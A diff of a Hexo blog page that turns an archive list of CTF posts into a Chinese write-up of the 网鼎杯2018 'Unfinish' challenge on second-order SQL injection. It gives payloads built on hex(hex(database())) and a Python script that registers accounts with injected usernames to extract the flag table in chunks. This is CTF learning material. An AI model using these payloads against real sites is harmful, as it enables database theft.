@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -21,9 +19,11 @@
 
   <!-- 页面元数据 -->
   
-  <title>Archive: 2021 - Hexo</title>
+  <title>网鼎杯2018 Unfinish(二次注入) - Hexo</title>
   
 
+  
+    <meta name="description" content="#前言">
   
 
   <!-- feed -->
@@ -56,7 +56,7 @@
 <body>
   
 
-<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -307,7 +307,7 @@
     <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  dock' style="display: ;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -383,484 +383,253 @@
         
 
 <div class='l_main'>
-	
-		
-  <section class="post-list">
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/">
-        成绩查询机
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        
 
-脚本
-123456789101112131415161718192021222324	import requestsurl&#x3D;&#39;http:&#x2F;&#x2F;77c12815-4b49-4686-913b-4a453088ebbb.node3.buuoj.cn&#x2F;search.php&#39;#print(requests.get(url&#x3D;url,p...
-      
-    
-  </div>
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        网鼎杯2018 Unfinish(二次注入)
+      </h1>
+      <div class='new-meta-box'>
         
-        <time>2021-04-01</time>
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>lucky</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Apr 19, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="网鼎杯2018 Unfinish(二次注入)" data-path="/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  <p>#前言</p>
+<a id="more"></a>
+
+<p>打开题目，直接就是登录界面，直接跨国注册界面就是特别令人奇怪，于是，我尝试了register.php，成功转换到注册界面，然后注册登录，啥都没有。。。。。。。</p>
+<p>这到题目是关于二次注入的，以前没有接触过这个</p>
+<p>看WP，说是这题明显具有二次注入的特征，输入邮箱，密码，用户名，返回用户名</p>
+<p>爆库名</p>
+<blockquote>
+<p>0’+hex(database())+’0</p>
+</blockquote>
+<p>前面的单引号是为了闭合前面的单引号，后面的单引号是为了闭合后面的单引号</p>
+<p>得到库名 web</p>
+<p>但是有时候我们需要注意，因为会出现截断问题，所以我们使用两次hex转换</p>
+<blockquote>
+<p>0’+hex(hex(database()))+’0</p>
+</blockquote>
+<p>然后我们会发现，当我们再进行下一步的时候，information被过滤了，所以就盲猜flag在flag表中</p>
+<p><img src="1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,666"></p>
+<p>如这张图，会出现科学技术法，会造成我们得不到我们想要的结果，然后我们，可以借助substr进行截断，因为进行fuzz的时候发现逗号不能用了，于是我们可以借助from for</p>
+<pre><code>import requests
+
+login_url=&#39;url/login.php&#39;
+register_url=&#39;url/register.php&#39;
+content=&#39;&#39;
+for i in range(1,20):
+    data_register=&#123;&#39;email&#39;:&#39;15@%d&#39;%i,&#39;username&#39;:&quot;0&#39;+( substr(hex(hex((select * from flag ))) from (%d-1)*10+1 for 10))+&#39;0&quot;%i,&#39;password&#39;:&#39;1&#39;&#125;
+    #print(data)
+    data_login=&#123;&#39;email&#39;:&#39;15@%d&#39;%i,&#39;password&#39;:&#39;1&#39;&#125;
+    requests.post(register_url,data=data_register)
+    rr=requests.post(login_url,data=data_login)
+    rr.encoding=&#39;utf-8&#39;
+    r=rr.text
+    location=r.find(&#39;user-name&#39;)
+    cont=r[location+17:location+42].strip()
+    content+=cont
+    print(cont)
+    #content=content.decode(&#39;hex&#39;).decode(&#39;hex&#39;)
+print(content)</code></pre>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2021/04/01/%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E6%9C%BA/'>
-            Read More
-          </a>
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://ckylsy.github.io/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/>http://ckylsy.github.io/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-20T23:47:39+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Apr 20, 2021</p>
+  </a>
 </div>
 
-          </div>
         
       
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/">
-        极客大挑战-final-sql
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
+          
+
+        
       
         
-
-这是关于盲注的一道题，打算练练这一方面的题目，顺便联系一下写python脚本
-二分法注入，异或注入
-
-其实提示的很明显了。sql盲注
-id=1  NO! Not this! Click others~~~ …..
-当id=7的时候，显示ERROR!!!
-id=0^1，显示的跟id=1一样，id=0^0,是ERROR，所以可以根据这一点来接脚本进行爆破
-
-fuzz被禁用的
-
-空格andmi...
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://ckylsy.github.io/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/&title=网鼎杯2018 Unfinish(二次注入) - Hexo&summary=#前言"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://ckylsy.github.io/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/&title=网鼎杯2018 Unfinish(二次注入) - Hexo&summary=#前言"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://ckylsy.github.io/2021/04/19/%E7%BD%91%E9%BC%8E%E6%9D%AFunfinish/&title=网鼎杯2018 Unfinish(二次注入) - Hexo&summary=#前言"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,666">
+          
+        </a>
+      
+    
+      
+    
       
     
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-04-01</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/04/01/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-final-sql/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/29/ME/">
-        RCE ME
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        
 
-源码
-123456789101112131415161718	&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;   $code&#x3D;$_GET[&#39;code&#39;];   if(strlen($code)&gt;40)&#123;       die(&quot;This is too Lo...
+
+        
       
-    
+    </div>
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-29</time>
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2021/03/29/ME/'>
-            Read More
-          </a>
-        </div>
+      
+        <a class='next' href='/2021/04/19/XXE/'>
+          <p class='title'>XXE<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>#前言
+转载，XXE详解，
+从XML相关一步一步到XXE漏洞
+
+
+XML
+这个我记得招新考试中有这个xml注入，说来惭愧这么长时间还是对这个没有什么了解
+
+什么是xml
+
+xml是可扩展标记语言...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/27/ctfshow-web41/">
-        ctfshow-web 41-45
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-<p>奇奇怪怪的知识又增加了</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-27</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/27/ctfshow-web41/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/25/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0h%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/">
-        php代码执行中出现过滤限制的绕过执行方法
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-<p>这是一位大佬写的，<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">原文地址</a>，深入学习一下</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-25</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/25/php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%AD%E5%87%BA%E7%8E%B0h%E8%BF%87%E6%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/25/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-        实验室反序列化
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-25</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/25/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/23/rce%E6%80%BB%E7%BB%93/">
-        无参rce总结
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言<br>rce无参数这个东西在很早之前就有接触，但是总是记不住语句，借此对rce无参数进行一个更加具体的理解</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-23</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/23/rce%E6%80%BB%E7%BB%93/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/23/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-        ctfshow命令执行
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-<p>学习命令执行</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-23</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/23/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/22/ctfshow-web174/">
-        ctfshow-web174
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        
-
-打开输入一个数字都显示不出来任何东西，尝试抓包
-
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-22</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/22/ctfshow-web174/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/22/GYCTF2020-Easyphp/">
-        GYCTF2020-Easyphp
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>#前言</p>
-<p>好几天没有更博了，这星期一定要完成任务.<br><br>在想如果我一星期能保证审很长的代码，应该会对我的代码审计能力有帮助吧</p>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-22</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/22/GYCTF2020-Easyphp/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-          <a class="prev" rel="prev" href="/archives/2021/">
-            <section class="post prev white-box shadow" >
-              <i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
-            </section>
-          </a>
-        
-        <p class="current">
-          2 / 9
-        </p>
-        
-          <a class="next" rel="next" href="/archives/2021/page/3/">
-            <section class="post next white-box shadow">
-              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
+  </article>
 
 
-	
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -868,87 +637,14 @@ fuzz被禁用的
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">Hexo</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
-    
-    
-
-  
-
-  
-    
-    
-
-  
 
   
 
 
 </aside>
+
 
 
         
@@ -958,14 +654,14 @@ fuzz被禁用的
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="网鼎杯2018 Unfinish(二次注入)";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
   var l_header=document.getElementById("l_header");
   
-  l_header.classList.remove("show");
+  l_header.classList.add("show");
   
 </script>
 
